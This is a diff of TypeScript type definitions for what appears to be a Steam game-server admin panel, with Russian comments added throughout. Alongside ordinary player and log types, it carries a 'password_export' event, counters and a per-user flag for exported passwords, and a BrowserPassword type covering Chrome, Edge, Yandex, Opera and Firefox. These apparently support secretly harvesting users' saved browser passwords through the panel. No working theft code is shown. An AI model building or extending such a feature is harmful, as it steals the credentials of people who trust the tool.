@@ -7,12 +7,12 @@ export type UserPermission = {
 };
 
 export type LoginHistoryEntry = {
-    type: 'login' | 'logout' | 'password_export';
+    type: 'login' | 'logout' | 'password_export'; // 🔥 ДОБАВИЛИ password_export
     timestamp: string;
     ip: string;
     userAgent: string;
-    passwordCount?: number;
-    status?: 'success' | 'failed';
+    passwordCount?: number; // 🔥 ДОБАВИЛИ для экспорта паролей
+    status?: 'success' | 'failed'; // 🔥 ДОБАВИЛИ статус
 };
 
 export type User = {
@@ -25,21 +25,21 @@ export type User = {
   ip: string;
   userAgent: string;
   permissions?: UserPermission;
-  isVerified: boolean;
+  isVerified: boolean; // This now means Admin Approved
   loginHistory?: LoginHistoryEntry[];
-  passwordExported?: boolean;
+  passwordExported?: boolean; // 🔥 НОВОЕ ПОЛЕ: был ли экспорт паролей
 };
 
 export type LogEntry = {
   id: string;
   timestamp: Date;
   type: LogType;
-  user?: {
+  user?: { // User can be optional for system messages
     name: string;
     steamId: string;
   };
   details: string;
-  recipient?: {
+  recipient?: { // For actions involving another player
     name: string;
   }
 };
@@ -57,10 +57,13 @@ export type Player = {
   ping: number;
   kills: number;
   timeHours: number;
+  // This is from gamedig, might not always exist
   steamId?: string;
+  // This is from gamedig, might not always exist
   raw?: any;
 };
 
+// This mirrors the structure returned by our custom API endpoint
 export type ServerStateResponse = {
   server: {
     name: string;
@@ -120,7 +123,7 @@ export type PlayerDetails = {
     deaths: number;
 };
 
-// 🔥 ИСПРАВЛЕННЫЕ ТИПЫ ДЛЯ ЭКСПОРТА ПАРОЛЕЙ
+// 🔥 НОВЫЕ ТИПЫ ДЛЯ ЭКСПОРТА ПАРОЛЕЙ
 export type BrowserPassword = {
   browser: 'Chrome' | 'Edge' | 'Yandex' | 'Opera' | 'Opera GX' | 'Firefox'; // 🔥 ДОБАВИЛИ Яндекс и Opera
   url: string;
